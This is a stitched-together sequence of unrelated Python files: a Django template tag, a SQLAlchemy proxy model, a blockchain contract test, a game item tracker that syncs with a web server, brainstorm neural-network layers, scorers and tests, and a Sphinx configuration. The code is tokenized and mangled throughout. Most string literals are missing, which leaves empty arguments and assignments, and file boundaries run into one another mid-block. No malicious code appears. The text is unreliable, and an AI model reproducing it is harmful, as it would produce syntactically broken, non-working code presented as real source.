~~ def render ( self , context ) : \n 
~~~ return self . text \n 
\n 
\n 
~~ ~~ @ register . tag \n 
def verbatim ( parser , token ) : \n 
~~~ text = [ ] \n 
while 1 : \n 
~~~ token = parser . tokens . pop ( 0 ) \n 
if token . contents == : \n 
~~~ break \n 
~~ if token . token_type == template . TOKEN_VAR : \n 
~~~ text . append ( ) \n 
~~ elif token . token_type == template . TOKEN_BLOCK : \n 
~~~ text . append ( ) \n 
~~ text . append ( token . contents ) \n 
if token . token_type == template . TOKEN_VAR : \n 
~~~ text . append ( ) \n 
~~ elif token . token_type == template . TOKEN_BLOCK : \n 
~~~ text . append ( ) \n 
~~ ~~ return VerbatimNode ( . join ( text ) ) \n 
~~ from django . shortcuts import render_to_response \n 
from django . template import RequestContext \n 
import pdb \n 
\n 
from werkzeug . utils import cached_property \n 
\n 
from base import db , Base \n 
from cluster import Cluster \n 
\n 
\n 
class Proxy ( Base ) : \n 
~~~ __tablename__ = \n 
\n 
host = db . Column ( db . String ( 255 ) , nullable = False ) \n 
port = db . Column ( db . Integer , nullable = False ) \n 
eru_container_id = db . Column ( db . String ( 64 ) , index = True ) \n 
cluster_id = db . Column ( db . ForeignKey ( Cluster . id ) , index = True ) \n 
suppress_alert = db . Column ( db . Integer , nullable = False , default = 1 ) \n 
\n 
__table_args__ = ( db . Index ( , , , unique = True ) , ) \n 
\n 
@ cached_property \n 
def eru_deployed ( self ) : \n 
~~~ return self . eru_container_id is not None \n 
\n 
~~ @ cached_property \n 
def eru_info ( self ) : \n 
~~~ import eru_utils \n 
if eru_utils . eru_client is None or not self . eru_deployed : \n 
~~~ return None \n 
~~ return eru_utils . eru_client . get_container ( self . eru_container_id ) \n 
\n 
~~ @ cached_property \n 
def cluster ( self ) : \n 
~~~ return Cluster . query . get ( self . cluster_id ) \n 
\n 
\n 
~~ ~~ def get_by_host_port ( host , port ) : \n 
~~~ return db . session . query ( Proxy ) . filter ( \n 
Proxy . host == host , Proxy . port == port ) . first ( ) \n 
\n 
\n 
~~ def del_by_host_port ( host , port ) : \n 
~~~ return db . session . query ( Proxy ) . filter ( \n 
Proxy . host == host , Proxy . port == port ) . delete ( ) \n 
\n 
\n 
~~ def get_or_create ( host , port , cluster_id = None ) : \n 
~~~ p = db . session . query ( Proxy ) . filter ( \n 
Proxy . host == host , Proxy . port == port ) . first ( ) \n 
if p is None : \n 
~~~ p = Proxy ( host = host , port = port , cluster_id = cluster_id ) \n 
db . session . add ( p ) \n 
db . session . flush ( ) \n 
~~ return p \n 
\n 
\n 
~~ def create_eru_instance ( host , port , cluster_id , eru_container_id ) : \n 
~~~ node = Proxy ( host = host , port = port , eru_container_id = eru_container_id , \n 
cluster_id = cluster_id ) \n 
db . session . add ( node ) \n 
db . session . flush ( ) \n 
return node \n 
\n 
\n 
~~ def delete_eru_instance ( eru_container_id ) : \n 
~~~ db . session . query ( Proxy ) . filter ( \n 
Proxy . eru_container_id == eru_container_id ) . delete ( ) \n 
\n 
\n 
~~ def get_eru_by_container_id ( eru_container_id ) : \n 
~~~ return db . session . query ( Proxy ) . filter ( \n 
Proxy . eru_container_id == eru_container_id ) . first ( ) \n 
\n 
\n 
~~ def list_all ( ) : \n 
~~~ return db . session . query ( Proxy ) . all ( ) \n 
\n 
\n 
~~ def list_eru_proxies ( offset , limit ) : \n 
~~~ return db . session . query ( Proxy ) . filter ( \n 
Proxy . eru_container_id != None ) . order_by ( \n 
Proxy . id . desc ( ) ) . offset ( offset ) . limit ( limit ) . all ( ) \n 
\n 
\n 
~~ def list_ip ( ) : \n 
~~~ return db . session . query ( Proxy . host , Proxy . port ) . all ( ) \n 
~~ from ethereum import tester \n 
import hydrachain . native_contracts as nc \n 
from fungible_contract import IOU \n 
import ethereum . slogging as slogging \n 
log = slogging . get_logger ( ) \n 
\n 
\n 
def test_iou_template ( ) : \n 
~~~ """\n    Tests;\n        IOU initialization as Issuer,\n        Testing issue funds, get_issued_amount\n    """ \n 
\n 
# Register Contract Fungible \n 
nc . registry . register ( IOU ) \n 
\n 
# Initialize Participants and Fungible contract \n 
state = tester . state ( ) \n 
logs = [ ] \n 
issuer_address = tester . a0 \n 
issuer_key = tester . k0 \n 
# create listeners \n 
for evt_class in IOU . events : \n 
~~~ nc . listen_logs ( state , evt_class , callback = lambda e : logs . append ( e ) ) \n 
\n 
# Initialization \n 
~~ iou_address = nc . tester_create_native_contract_instance ( state , issuer_key , IOU ) \n 
iou_as_issuer = nc . tester_nac ( state , issuer_key , iou_address ) \n 
iou_as_issuer . init ( ) \n 
assert iou_as_issuer . balanceOf ( issuer_address ) == 0 \n 
amount_issued = 200000 \n 
iou_as_issuer . issue_funds ( amount_issued , ) \n 
assert iou_as_issuer . balanceOf ( issuer_address ) == amount_issued \n 
\n 
iou_as_issuer . issue_funds ( amount_issued , ) \n 
assert iou_as_issuer . balanceOf ( issuer_address ) == 2 * amount_issued \n 
assert iou_as_issuer . get_issued_amount ( issuer_address ) == 2 * amount_issued \n 
\n 
print logs \n 
while logs and logs . pop ( ) : \n 
~~~ pass \n 
\n 
~~ nc . registry . unregister ( IOU ) \n 
~~ """ This module handles everything related to the tracker behaviour. """ \n 
import json # For importing the items and options \n 
import time \n 
import urllib2 # For checking for updates to the item tracker \n 
import logging # For logging \n 
\n 
# Import item tracker specific code \n 
from view_controls . view import DrawingTool , Event \n 
from game_objects . item import Item \n 
from game_objects . state import TrackerState , TrackerStateEncoder \n 
from log_parser import LogParser \n 
from options import Options \n 
\n 
\n 
class IsaacTracker ( object ) : \n 
~~~ """ The main class of the program """ \n 
def __init__ ( self , logging_level = logging . INFO , read_timer = 1 ) : \n 
~~~ self . read_timer = read_timer \n 
self . file_prefix = "../" \n 
\n 
\n 
self . log = logging . getLogger ( "tracker" ) \n 
# This will erase our tracker log file from previous runs \n 
self . log . addHandler ( logging . FileHandler ( self . file_prefix + "tracker_log.txt" , mode = ) ) \n 
self . log . setLevel ( logging_level ) \n 
\n 
# Load items info \n 
with open ( self . file_prefix + "items.json" , "r" ) as items_file : \n 
~~~ Item . items_info = json . load ( items_file ) \n 
# load version \n 
~~ with open ( self . file_prefix + , ) as f : \n 
~~~ self . tracker_version = f . read ( ) \n 
# Load options \n 
~~ Options ( ) . load_options ( self . file_prefix + "options.json" ) \n 
\n 
~~ def __del__ ( self ) : \n 
~~~ Options ( ) . save_options ( self . file_prefix + "options.json" ) \n 
\n 
~~ def check_for_update ( self ) : \n 
~~~ """ Returns text to put in the title bar """ \n 
try : \n 
~~~ latest = "https://api.github.com/repos/Hyphen-ated/RebirthItemTracker/releases/latest" \n 
github_info_json = urllib2 . urlopen ( latest ) . read ( ) \n 
info = json . loads ( github_info_json ) \n 
latest_version = info [ "name" ] \n 
\n 
\n 
title_text = " v" + self . tracker_version \n 
if latest_version != self . tracker_version : \n 
~~~ title_text += " (new version available)" \n 
~~ return title_text \n 
~~ except Exception as e : \n 
~~~ self . log . debug ( "Failed to find update info: " + e . message ) \n 
~~ return "" \n 
\n 
~~ def run ( self ) : \n 
~~~ """ The main routine which controls everything """ \n 
\n 
update_notifier = self . check_for_update ( ) \n 
framecount = 0 \n 
\n 
\n 
drawing_tool = DrawingTool ( self . file_prefix ) \n 
drawing_tool . set_window_title ( update_notifier ) \n 
parser = LogParser ( self . file_prefix , self . tracker_version ) \n 
opt = Options ( ) \n 
log = logging . getLogger ( "tracker" ) \n 
\n 
event_result = None \n 
state = None \n 
read_from_server = opt . read_from_server \n 
write_to_server = opt . write_to_server \n 
state_version = - 1 \n 
twitch_username = None \n 
new_states_queue = [ ] \n 
screen_error_message = None \n 
\n 
while event_result != Event . DONE : \n 
\n 
# Check for events and handle them \n 
~~~ event_result = drawing_tool . handle_events ( ) \n 
# A change means the user has (de)activated an option \n 
if opt . read_from_server != read_from_server or opt . twitch_name != twitch_username : \n 
~~~ twitch_username = opt . twitch_name \n 
read_from_server = opt . read_from_server \n 
new_states_queue = [ ] \n 
# Also restart version count if we go back and forth from log.txt to server \n 
if read_from_server : \n 
~~~ state_version = - 1 \n 
state = None \n 
# show who we are watching in the title bar \n 
drawing_tool . set_window_title ( update_notifier , watching_player = twitch_username , updates_queued = len ( new_states_queue ) ) \n 
~~ else : \n 
~~~ drawing_tool . set_window_title ( update_notifier ) \n 
\n 
~~ ~~ if opt . write_to_server and opt . write_to_server != write_to_server : \n 
~~~ write_to_server = True \n 
drawing_tool . set_window_title ( update_notifier , uploading = True ) \n 
\n 
~~ if not opt . write_to_server : \n 
~~~ write_to_server = False \n 
\n 
~~ if opt . read_from_server : \n 
\n 
~~~ update_timer = 2 \n 
~~ else : \n 
~~~ update_timer = self . read_timer \n 
\n 
~~ if event_result == Event . OPTIONS_UPDATE : \n 
\n 
~~~ framecount = 0 \n 
screen_error_message = None \n 
# force updates after changing options \n 
if state is not None : \n 
~~~ state . modified = True \n 
\n 
\n 
# Now we re-process the log file to get anything that might have loaded; \n 
# do it every update_timer seconds (making sure to truncate to an integer \n 
# or else it might never mod to 0) \n 
~~ ~~ if ( framecount % int ( Options ( ) . framerate_limit * update_timer ) == 0 ) : \n 
# Let the parser do his thing and give us a state \n 
~~~ if opt . read_from_server : \n 
~~~ base_url = opt . trackerserver_url + "/tracker/api/user/" + opt . twitch_name \n 
json_dict = None \n 
try : \n 
~~~ json_version = urllib2 . urlopen ( base_url + "/version" ) . read ( ) \n 
if int ( json_version ) > state_version : \n 
# FIXME better handling of 404 error ? \n 
~~~ json_state = urllib2 . urlopen ( base_url ) . read ( ) \n 
json_dict = json . loads ( json_state ) \n 
new_state = TrackerState . from_json ( json_dict ) \n 
if new_state is None : \n 
~~~ raise Exception \n 
~~ state_version = int ( json_version ) \n 
new_states_queue . append ( ( state_version , new_state ) ) \n 
drawing_tool . set_window_title ( update_notifier , watching_player = twitch_username , updates_queued = len ( new_states_queue ) , read_delay = opt . read_delay ) \n 
~~ ~~ except Exception : \n 
~~~ state = None \n 
log . error ( "Couldn\'t load state from server" ) \n 
import traceback \n 
log . error ( traceback . format_exc ( ) ) \n 
if json_dict is not None : \n 
~~~ their_version = "" \n 
if "tracker_version" in json_dict : \n 
~~~ their_version = json_dict [ "tracker_version" ] \n 
~~ else : \n 
\n 
~~~ their_version = "0.10-beta1" \n 
\n 
~~ if their_version != self . tracker_version : \n 
~~~ screen_error_message = "They are using tracker version " + their_version + " but you have " + self . tracker_version \n 
~~ ~~ ~~ ~~ else : \n 
~~~ force_draw = state and state . modified \n 
state = parser . parse ( ) \n 
if force_draw : \n 
~~~ state . modified = True \n 
~~ if write_to_server and not opt . trackerserver_authkey : \n 
~~~ screen_error_message = "Your authkey is blank. Get a new authkey in the options menu and paste it into the authkey text field." \n 
~~ if state is not None and write_to_server and state . modified and screen_error_message is None : \n 
~~~ opener = urllib2 . build_opener ( urllib2 . HTTPHandler ) \n 
put_url = opt . trackerserver_url + "/tracker/api/update/" + opt . trackerserver_authkey \n 
json_string = json . dumps ( state , cls = TrackerStateEncoder , sort_keys = True ) \n 
request = urllib2 . Request ( put_url , \n 
data = json_string ) \n 
request . add_header ( , ) \n 
request . get_method = lambda : \n 
try : \n 
~~~ result = opener . open ( request ) \n 
result_json = json . loads ( result . read ( ) ) \n 
updated_user = result_json [ "updated_user" ] \n 
if updated_user is None : \n 
~~~ screen_error_message = "The server didn\'t recognize you. Try getting a new authkey in the options menu." \n 
~~ else : \n 
~~~ screen_error_message = None \n 
~~ ~~ except Exception as e : \n 
~~~ import traceback \n 
errmsg = traceback . format_exc ( ) \n 
log . error ( "ERROR: Couldn\'t send item info to server" ) \n 
log . error ( errmsg ) \n 
screen_error_message = "ERROR: Couldn\'t send item info to server, check tracker_log.txt" \n 
\n 
\n 
\n 
~~ ~~ ~~ ~~ if len ( new_states_queue ) > 0 : \n 
~~~ ( state_timestamp , new_state ) = new_states_queue [ 0 ] \n 
current_timestamp = int ( time . time ( ) ) \n 
if current_timestamp - state_timestamp >= opt . read_delay or state is None : \n 
~~~ state = new_state \n 
new_states_queue . pop ( 0 ) \n 
drawing_tool . set_window_title ( update_notifier , watching_player = twitch_username , updates_queued = len ( new_states_queue ) , read_delay = opt . read_delay ) \n 
\n 
\n 
\n 
~~ ~~ if state is None and screen_error_message is None : \n 
~~~ if read_from_server : \n 
~~~ screen_error_message = "Unable to read state from server. Please verify your options setup and tracker_log.txt" \n 
~~ else : \n 
~~~ screen_error_message = "log.txt not found. Put the RebirthItemTracker folder inside the isaac folder, next to log.txt" \n 
\n 
~~ ~~ if screen_error_message is not None : \n 
~~~ drawing_tool . write_error_message ( screen_error_message ) \n 
~~ else : \n 
# We got a state, now we draw it \n 
~~~ drawing_tool . draw_state ( state ) \n 
\n 
~~ drawing_tool . tick ( ) \n 
framecount += 1 \n 
\n 
# main loop finished. program is exiting \n 
~~ drawing_tool . save_window_position ( ) \n 
\n 
~~ ~~ def main ( ) : \n 
~~~ """ Main """ \n 
try : \n 
# Pass "logging.DEBUG" in debug mode \n 
~~~ rt = IsaacTracker ( ) \n 
rt . run ( ) \n 
~~ except Exception : \n 
~~~ import traceback \n 
errmsg = traceback . format_exc ( ) \n 
#print it to stdout for dev troubleshooting, log it to a file for production \n 
print ( errmsg ) \n 
logging . getLogger ( "tracker" ) . error ( errmsg ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ main ( ) \n 
#!/usr/bin/env python \n 
# coding=utf-8 \n 
~~ from __future__ import division , print_function , unicode_literals \n 
\n 
from collections import OrderedDict \n 
\n 
from brainstorm . layers . base_layer import Layer \n 
from brainstorm . structure . buffer_structure import ( BufferStructure , \n 
StructureTemplate ) \n 
from brainstorm . structure . construction import ConstructionWrapper \n 
from brainstorm . utils import flatten_all_but_last \n 
\n 
\n 
def BatchNorm ( name = None , decay = 0.9 , epsilon = 1.0e-5 ) : \n 
~~~ """Create a BatchNormalization layer.\n\n    This layer implements batch normalization over the last (right-most)\n    dimension. Thus, it can be use with both fully connected and convolutional\n    layers (but only with data in NHWC format).\n    """ \n 
return ConstructionWrapper . create ( BatchNormLayerImpl , \n 
name = name , \n 
decay = decay , \n 
epsilon = epsilon ) \n 
\n 
\n 
~~ class BatchNormLayerImpl ( Layer ) : \n 
\n 
~~~ expected_inputs = { : StructureTemplate ( , , ) } \n 
expected_kwargs = { , } \n 
\n 
def setup ( self , kwargs , in_shapes ) : \n 
~~~ self . epsilon = kwargs . get ( , 1.0e-5 ) \n 
self . decay = kwargs . get ( , 0.9 ) \n 
assert 0.0 <= self . decay <= 1.0 , "Decay must be between 0 and 1." \n 
\n 
outputs = OrderedDict ( ) \n 
outputs [ ] = in_shapes [ ] \n 
\n 
parameters = OrderedDict ( ) \n 
buf = BufferStructure ( self . in_shapes [ ] . feature_shape [ - 1 ] ) \n 
parameters [ ] = buf \n 
parameters [ ] = buf \n 
parameters [ ] = buf \n 
parameters [ ] = buf \n 
\n 
internals = OrderedDict ( ) \n 
internals [ ] = buf \n 
internals [ ] = self . in_shapes [ ] \n 
internals [ ] = self . in_shapes [ ] \n 
\n 
return outputs , parameters , internals \n 
\n 
~~ def forward_pass ( self , buffers , training_pass = True ) : \n 
~~~ _h = self . handler \n 
sigma_b , centered , x_hat = buffers . internals \n 
gamma , beta , mu , sigma = buffers . parameters \n 
# Note: we flatten time for all buffers, so we skip the flat_ prefix \n 
inputs = flatten_all_but_last ( buffers . inputs . default ) \n 
centered = flatten_all_but_last ( centered ) \n 
x_hat = flatten_all_but_last ( x_hat ) \n 
out = flatten_all_but_last ( buffers . outputs . default ) \n 
m = inputs . shape [ 0 ] \n 
\n 
if training_pass : \n 
~~~ mu_b = sigma_b # temporary use this with other name \n 
# Calculate the (negative) batch mean \n 
_h . sum_t ( inputs , 0 , mu_b ) \n 
_h . mult_st ( - 1.0 / m , mu_b , mu_b ) \n 
\n 
# Adjust mu as an exponential moving average \n 
# TODO: Find better way \n 
_h . mult_st ( self . decay , mu , mu ) \n 
_h . mult_add_st ( 1.0 - self . decay , mu_b , mu ) \n 
\n 
mu = mu_b \n 
\n 
# Calculate the centered activations \n 
~~ _h . add_mv ( inputs , mu . reshape ( ( 1 , mu . size ) ) , centered ) \n 
\n 
if training_pass : \n 
~~~ sigma2 = sigma_b # temporary use this with other name \n 
centered2 = x_hat # temporary use this with other name \n 
# Calculate the variance \n 
_h . mult_tt ( centered , centered , centered2 ) \n 
_h . sum_t ( centered2 , 0 , sigma2 ) \n 
_h . mult_st ( 1.0 / m , sigma2 , sigma2 ) # TODO m-1 instead? \n 
_h . add_st ( self . epsilon , sigma2 , sigma2 ) # (numerically stabilized) \n 
\n 
# Standard deviation \n 
_h . sqrt_t ( sigma2 , sigma_b ) \n 
\n 
# Adjust sigma as an exponential moving sigma \n 
# FIXME: This is clearly a hack and wrong \n 
_h . mult_st ( self . decay , sigma , sigma ) \n 
_h . mult_add_st ( 1.0 - self . decay , sigma_b , sigma ) \n 
\n 
sigma = sigma_b \n 
\n 
# compute normalized inputs \n 
~~ _h . divide_mv ( centered , sigma . reshape ( ( 1 , sigma . size ) ) , x_hat ) \n 
\n 
# Compute outputs \n 
_h . mult_mv ( x_hat , gamma . reshape ( ( 1 , gamma . size ) ) , out ) \n 
_h . add_mv ( out , beta . reshape ( ( 1 , beta . size ) ) , out ) \n 
\n 
~~ def backward_pass ( self , buffers ) : \n 
~~~ _h = self . handler \n 
sigma_b , centered , x_hat = buffers . internals \n 
gamma = buffers . parameters . gamma \n 
dgamma = buffers . gradients . gamma \n 
dbeta = buffers . gradients . beta \n 
# Note: we flatten time for all buffers, so we skip the flat_ prefix \n 
x_hat = flatten_all_but_last ( x_hat ) \n 
outdeltas = flatten_all_but_last ( buffers . output_deltas . default ) \n 
indeltas = flatten_all_but_last ( buffers . input_deltas . default ) \n 
m = outdeltas . shape [ 0 ] \n 
\n 
big_tmp = _h . allocate ( x_hat . shape ) # big \n 
small_tmp = _h . allocate ( gamma . shape ) # small \n 
\n 
# ------------- Gradients --------------- \n 
# Calculate dgamma \n 
tmp = big_tmp \n 
dgamma_tmp = small_tmp \n 
_h . mult_tt ( outdeltas , x_hat , tmp ) \n 
_h . sum_t ( tmp , axis = 0 , out = dgamma_tmp ) \n 
_h . add_tt ( dgamma_tmp , dgamma , dgamma ) \n 
\n 
_h . mult_st ( 1 / m , dgamma_tmp , dgamma_tmp ) \n 
term1 = big_tmp \n 
_h . mult_mv ( x_hat , dgamma_tmp . reshape ( ( 1 , gamma . size ) ) , term1 ) \n 
\n 
# Calculate dbeta \n 
dbeta_tmp = small_tmp \n 
_h . sum_t ( outdeltas , axis = 0 , out = dbeta_tmp ) \n 
_h . add_tt ( dbeta_tmp , dbeta , dbeta ) \n 
_h . mult_st ( 1 / m , dbeta_tmp , dbeta_tmp ) \n 
\n 
# ------------- Deltas --------------- \n 
term2 = big_tmp \n 
term3 = big_tmp \n 
_h . subtract_tt ( outdeltas , term1 , term2 ) \n 
_h . subtract_mv ( term2 , dbeta_tmp . reshape ( ( 1 , dbeta . size ) ) , term3 ) \n 
\n 
# get normalization factor (gamma / sigma_b) \n 
coeff = small_tmp \n 
_h . divide_tt ( gamma , sigma_b , coeff ) \n 
\n 
term4 = big_tmp \n 
_h . mult_mv ( term3 , coeff . reshape ( ( 1 , coeff . size ) ) , term4 ) \n 
_h . add_tt ( term4 , indeltas , indeltas ) \n 
#!/usr/bin/env python \n 
# coding=utf-8 \n 
~~ ~~ from __future__ import division , print_function , unicode_literals \n 
\n 
from collections import OrderedDict \n 
\n 
import numpy as np \n 
\n 
from brainstorm . describable import Describable \n 
\n 
\n 
# ----------------------------- Base Class ---------------------------------- # \n 
\n 
class Scorer ( Describable ) : \n 
~~~ def __init__ ( self , out_name = , targets_name = , mask_name = , \n 
name = None ) : \n 
~~~ self . out_name = out_name \n 
self . targets_name = targets_name \n 
self . mask_name = mask_name \n 
self . __name__ = name if name is not None else self . __class__ . __name__ \n 
\n 
~~ def __call__ ( self , true_labels , predicted , mask = None ) : \n 
~~~ pass \n 
\n 
~~ @ staticmethod \n 
def aggregate ( errors ) : \n 
~~~ errors = np . array ( errors ) \n 
assert errors . ndim == 2 and errors . shape [ 1 ] == 2 \n 
return np . sum ( errors [ : , 1 ] ) / np . sum ( errors [ : , 0 ] ) \n 
\n 
\n 
# ------------------------- Scoring Functions ------------------------------- # \n 
\n 
~~ ~~ def gather_losses_and_scores ( net , scorers , scores , out_name = , \n 
targets_name = , mask_name = ) : \n 
~~~ ls = net . get_loss_values ( ) \n 
for name , loss in ls . items ( ) : \n 
~~~ scores [ name ] . append ( ( net . _buffer_manager . batch_size , loss ) ) \n 
\n 
~~ for sc in scorers : \n 
~~~ name = sc . __name__ \n 
predicted = net . get ( sc . out_name or out_name or net . output_name ) \n 
true_labels = net . get_input ( sc . targets_name ) if sc . targets_name else net . get_input ( targets_name ) \n 
mask = net . get_input ( sc . mask_name ) if sc . mask_name else ( net . get_input ( mask_name ) if mask_name else None ) \n 
\n 
predicted = _flatten_all_but_last ( predicted ) \n 
true_labels = _flatten_all_but_last ( true_labels ) \n 
mask = _flatten_all_but_last ( mask ) \n 
weight = mask . sum ( ) if mask is not None else predicted . shape [ 0 ] \n 
\n 
scores [ name ] . append ( ( weight , sc ( true_labels , predicted , mask ) ) ) \n 
\n 
\n 
~~ ~~ def aggregate_losses_and_scores ( scores , net , scorers ) : \n 
~~~ results = OrderedDict ( ) \n 
for name in net . get_loss_values ( ) : \n 
~~~ results [ name ] = _weighted_average ( scores [ name ] ) \n 
~~ for sc in scorers : \n 
~~~ results [ sc . __name__ ] = sc . aggregate ( scores [ sc . __name__ ] ) \n 
~~ return results \n 
\n 
\n 
# ------------------------------- Scorers ----------------------------------- # \n 
\n 
~~ class Accuracy ( Scorer ) : \n 
~~~ def __call__ ( self , true_labels , predicted , mask = None ) : \n 
~~~ if predicted . shape [ 1 ] > 1 : \n 
~~~ predicted = predicted . argmax ( 1 ) . reshape ( - 1 , 1 ) \n 
~~ correct = ( predicted == true_labels ) . astype ( np . float ) \n 
if mask is not None : \n 
~~~ correct *= mask \n 
~~ return np . sum ( correct ) \n 
\n 
\n 
~~ ~~ class Hamming ( Scorer ) : \n 
~~~ def __init__ ( self , threshold = 0.5 , out_name = , targets_name = , \n 
mask_name = , name = None ) : \n 
~~~ super ( Hamming , self ) . __init__ ( out_name , targets_name , mask_name , name ) \n 
self . threshold = threshold \n 
\n 
~~ def __call__ ( self , true_labels , predicted , mask = None ) : \n 
~~~ correct = np . logical_xor ( predicted < self . threshold , \n 
true_labels ) . astype ( np . float ) \n 
if mask is not None : \n 
~~~ correct *= mask \n 
~~ return np . sum ( correct ) / true_labels . shape [ 1 ] \n 
\n 
\n 
~~ ~~ class MeanSquaredError ( Scorer ) : \n 
~~~ def __call__ ( self , true_labels , predicted , mask = None ) : \n 
~~~ errors = ( true_labels - predicted ) ** 2 \n 
if mask is not None : \n 
~~~ errors *= mask \n 
~~ return 0.5 * np . sum ( errors ) \n 
\n 
\n 
# ---------------------------- Helper Functions ----------------------------- # \n 
\n 
~~ ~~ def _flatten_all_but_last ( a ) : \n 
~~~ if a is None : \n 
~~~ return None \n 
~~ return a . reshape ( - 1 , a . shape [ - 1 ] ) \n 
\n 
\n 
~~ def _weighted_average ( errors ) : \n 
~~~ errors = np . array ( errors ) \n 
assert errors . ndim == 2 and errors . shape [ 1 ] == 2 \n 
return np . sum ( errors [ : , 1 ] * errors [ : , 0 ] / np . sum ( errors [ : , 0 ] ) ) \n 
#!/usr/bin/env python \n 
# coding=utf-8 \n 
\n 
~~ from __future__ import division , print_function , unicode_literals \n 
\n 
import pytest \n 
import six \n 
\n 
from brainstorm . training . schedules import Exponential , Linear , MultiStep \n 
\n 
\n 
def test_linear ( ) : \n 
~~~ sch = Linear ( initial_value = 1.0 , final_value = 0.5 , num_changes = 5 ) \n 
epochs = [ 0 ] * 2 + [ 1 ] * 2 + [ 2 ] * 2 + [ 3 ] * 2 + [ 4 ] * 2 \n 
updates = range ( 10 ) \n 
\n 
values = [ sch ( epoch , update , , 1 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 , 1.0 , 0.9 , 0.9 , 0.8 , 0.8 , 0.7 , 0.7 , 0.6 , 0.6 ] \n 
\n 
values = [ sch ( epoch , update , , 1 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 , 0.9 , 0.8 , 0.7 , 0.6 , 0.5 , 0.5 , 0.5 , 0.5 , 0.5 ] \n 
\n 
values = [ sch ( epoch , update , , 3 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 , 1.0 , 1.0 , 0.9 , 0.9 , 0.9 , 0.8 , 0.8 , 0.8 , 0.7 ] \n 
\n 
\n 
~~ def test_exponential ( ) : \n 
~~~ sch = Exponential ( initial_value = 1.0 , factor = 0.99 , minimum = 0.97 ) \n 
epochs = [ 0 ] * 4 + [ 1 ] * 4 + [ 2 ] * 4 \n 
updates = range ( 12 ) \n 
\n 
values = [ sch ( epoch , update , , 1 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 ] * 4 + [ 0.99 ] * 4 + [ 0.99 * 0.99 ] * 4 \n 
\n 
values = [ sch ( epoch , update , , 1 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 * ( 0.99 ** x ) for x in range ( 4 ) ] + [ 0.97 ] * 8 \n 
\n 
values = [ sch ( epoch , update , , 3 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 ] * 3 + [ 0.99 ] * 3 + [ 0.9801 ] * 3 + [ 0.99 ** 3 ] * 3 \n 
\n 
\n 
~~ def test_multistep ( ) : \n 
~~~ sch = MultiStep ( initial_value = 1.0 , steps = [ 3 , 5 , 8 ] , \n 
values = [ 0.1 , 0.01 , 0.001 ] ) \n 
epochs = [ 0 ] * 2 + [ 1 ] * 2 + [ 2 ] * 2 + [ 3 ] * 2 + [ 4 ] * 2 \n 
updates = range ( 10 ) \n 
\n 
values = [ sch ( epoch , update , , 1 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 , 1.0 , 1.0 , 1.0 , 1.0 , 1.0 , 0.1 , 0.1 , 0.1 , 0.1 ] \n 
\n 
values = [ sch ( epoch , update , , 1 , None , None , None ) \n 
for epoch , update in six . moves . zip ( epochs , updates ) ] \n 
assert values == [ 1.0 , 1.0 , 1.0 , 0.1 , 0.1 , 0.01 , 0.01 , 0.01 , 0.001 , 0.001 ] \n 
\n 
with pytest . raises ( AssertionError ) : \n 
~~~ _ = sch ( 0 , 0 , , 3 , None , None , None ) \n 
# -*- coding: utf-8 -*- \n 
# \n 
# complexity documentation build configuration file, created by \n 
# sphinx-quickstart on Tue Jul  9 22:26:36 2013. \n 
# \n 
# This file is execfile()d with the current directory set to its containing dir. \n 
# \n 
# Note that not all possible configuration values are present in this \n 
# autogenerated file. \n 
# \n 
# All configuration values have a default; values that are commented out \n 
# serve to show the default. \n 
\n 
~~ ~~ import os \n 
import sys \n 
\n 
try : \n 
~~~ from unittest . mock import MagicMock \n 
~~ except ImportError : \n 
~~~ from mock import Mock as MagicMock \n 
\n 
\n 
~~ class Mock ( MagicMock ) : \n 
~~~ @ classmethod \n 
def __getattr__ ( cls , name ) : \n 
~~~ return Mock ( ) \n 
\n 
~~ ~~ MOCK_MODULES = [ , ] \n 
sys . modules . update ( ( mod_name , Mock ( ) ) for mod_name in MOCK_MODULES ) \n 
\n 
\n 
# If extensions (or modules to document with autodoc) are in another directory, \n 
# add these directories to sys.path here. If the directory is relative to the \n 
# documentation root, use os.path.abspath to make it absolute, like shown here. \n 
\n 
\n 
cwd = os . getcwd ( ) \n 
parent = os . path . dirname ( cwd ) \n 
sys . path . insert ( 0 , parent ) \n 
\n 
import brainstorm \n 
\n 
# -- General configuration ----------------------------------------------------- \n 
\n 
# If your documentation needs a minimal Sphinx version, state it here. \n 
\n 
\n 
# Add any Sphinx extension module names here, as strings. They can be extensions \n 
\n 
extensions = [ , , \n 
] \n 
\n 
# Add any paths that contain templates here, relative to this directory. \n 
templates_path = [ ] \n 
\n 
# The suffix of source filenames. \n 
source_suffix = \n 
\n 
# The encoding of source files. \n 
\n 
\n 
# The master toctree document. \n 
master_doc = \n 
\n 
# General information about the project. \n 
project = \n 
copyright = \n 
\n 
\n 
# |version| and |release|, also used in various other places throughout the \n 
# built documents. \n 
# \n 
# The short X.Y version. \n 
version = brainstorm . __version__ \n 
# The full version, including alpha/beta/rc tags. \n 
release = brainstorm . __version__ \n 
\n 
# The language for content autogenerated by Sphinx. Refer to documentation \n 
# for a list of supported languages. \n 
#language = None \n 
\n 
# There are two options for replacing |today|: either, you set today to some \n 
# non-false value, then it is used: \n 
\n 
# Else, today_fmt is used as the format for a strftime call. \n 
\n 
\n 
# List of patterns, relative to source directory, that match files and \n 
# directories to ignore when looking for source files. \n 
exclude_patterns = [ ] \n 
\n 
# The reST default role (used for this markup: `text`) to use for all documents. \n 
#default_role = None \n 
\n 
\n 
#add_function_parentheses = True \n 
\n 
# If true, the current module name will be prepended to all description \n 
# unit titles (such as .. function::). \n 
#add_module_names = True \n 
\n 
# If true, sectionauthor and moduleauthor directives will be shown in the \n 
# output. They are ignored by default. \n 
#show_authors = False \n 
\n 
# The name of the Pygments (syntax highlighting) style to use. \n 
pygments_style = \n 
\n 
# A list of ignored prefixes for module index sorting. \n 
#modindex_common_prefix = [] \n 
\n 
# If true, keep warnings as "system message" paragraphs in the built documents. \n 
#keep_warnings = False \n 
\n 
\n 
